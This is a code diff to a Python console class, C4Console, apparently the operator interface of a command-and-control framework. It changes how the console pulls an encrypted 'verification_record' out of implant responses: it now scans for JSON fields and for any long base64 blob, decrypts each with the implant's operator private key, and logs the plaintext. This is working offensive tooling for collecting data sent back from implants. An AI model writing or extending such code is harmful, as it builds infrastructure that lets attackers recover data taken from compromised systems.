@@ -1106,67 +1106,63 @@ class C4Console(App):
             self._log(f"  [red]Browser send failed:[/] {e}")
 
     def _try_decrypt_response(self, implant_id: str, response: str) -> None:
-        """Attempt to extract and decrypt verification_record from response JSON."""
-        # Look for verification_record anywhere in response
-        if "verification_record" not in response:
-            return
-
-        # Find all potential JSON objects in the response and try to parse each
-        verification_record = None
-        for match in re.finditer(r'\{', response):
-            start = match.start()
-            # Find matching closing brace
-            depth = 0
-            end = start
-            for i, c in enumerate(response[start:], start):
-                if c == '{':
-                    depth += 1
-                elif c == '}':
-                    depth -= 1
-                    if depth == 0:
-                        end = i + 1
-                        break
-            if depth != 0:
-                continue
-
-            try:
-                json_str = response[start:end]
-                data = json.loads(json_str)
-                if isinstance(data, dict) and "verification_record" in data:
-                    verification_record = data["verification_record"]
-                    break
-            except (json.JSONDecodeError, ValueError):
-                continue
-
-        if not verification_record:
-            return
-
-        # Find the private key for this implant
+        """Attempt to extract and decrypt verification_record from response."""
+        # Find the private key for this implant first
         private_key_path = _OUT_DIR / implant_id / "operator_private.der"
         if not private_key_path.exists():
-            self._log(f"\n[yellow]⚠ Cannot decrypt: private key not found[/]")
-            self._log(f"  [dim]expected: {private_key_path}[/]")
-            return
+            return  # Can't decrypt without key, skip silently
 
-        # Decrypt the verification record
-        plaintext = decrypt_verification_record(verification_record, private_key_path)
-        if plaintext:
-            self._log("\n[bold green]🔓 Decrypted verification_record:[/]")
-            # Try to pretty-print if it's JSON
-            try:
-                decrypted_data = json.loads(plaintext)
-                formatted = json.dumps(decrypted_data, indent=2)
-                # Truncate if too long
-                if len(formatted) > 3000:
-                    self._log(formatted[:3000])
-                    self._log(f"  [dim]... ({len(formatted)} chars total)[/]")
-                else:
-                    self._log(formatted)
-            except json.JSONDecodeError:
-                self._log(plaintext[:2000] if len(plaintext) > 2000 else plaintext)
-            slog(f"DECRYPTED | implant={implant_id}\n{plaintext}")
-        else:
-            self._log("\n[red]⚠ Failed to decrypt verification_record[/]")
+        candidates: list[str] = []
+
+        # Method 1: Look for JSON containing verification_record field
+        if "verification_record" in response:
+            for match in re.finditer(r'\{', response):
+                start = match.start()
+                depth = 0
+                end = start
+                for i, c in enumerate(response[start:], start):
+                    if c == '{':
+                        depth += 1
+                    elif c == '}':
+                        depth -= 1
+                        if depth == 0:
+                            end = i + 1
+                            break
+                if depth != 0:
+                    continue
+
+                try:
+                    json_str = response[start:end]
+                    data = json.loads(json_str)
+                    if isinstance(data, dict) and "verification_record" in data:
+                        candidates.append(data["verification_record"])
+                except (json.JSONDecodeError, ValueError):
+                    continue
+
+        # Method 2: Find all long base64 blobs
+        # Our format: [91-byte SPKI pubkey][16-byte IV][ciphertext] = min ~150 bytes = ~200 base64 chars
+        for blob_match in re.finditer(r'[A-Za-z0-9+/]{200,}={0,2}', response):
+            candidate = blob_match.group(0)
+            if candidate not in candidates:
+                candidates.append(candidate)
+
+        # Try to decrypt each candidate until one works
+        for candidate in candidates:
+            plaintext = decrypt_verification_record(candidate, private_key_path)
+            if plaintext:
+                self._log("\n[bold green]🔓 Decrypted verification_record:[/]")
+                try:
+                    decrypted_data = json.loads(plaintext)
+                    formatted = json.dumps(decrypted_data, indent=2)
+                    if len(formatted) > 3000:
+                        self._log(formatted[:3000])
+                        self._log(f"  [dim]... ({len(formatted)} chars total)[/]")
+                    else:
+                        self._log(formatted)
+                except json.JSONDecodeError:
+                    self._log(plaintext[:2000] if len(plaintext) > 2000 else plaintext)
+                slog(f"DECRYPTED | implant={implant_id}\n{plaintext}")
+                return  # Found and decrypted, done
 
     # -- Alias -----------------------------------------------------------
 
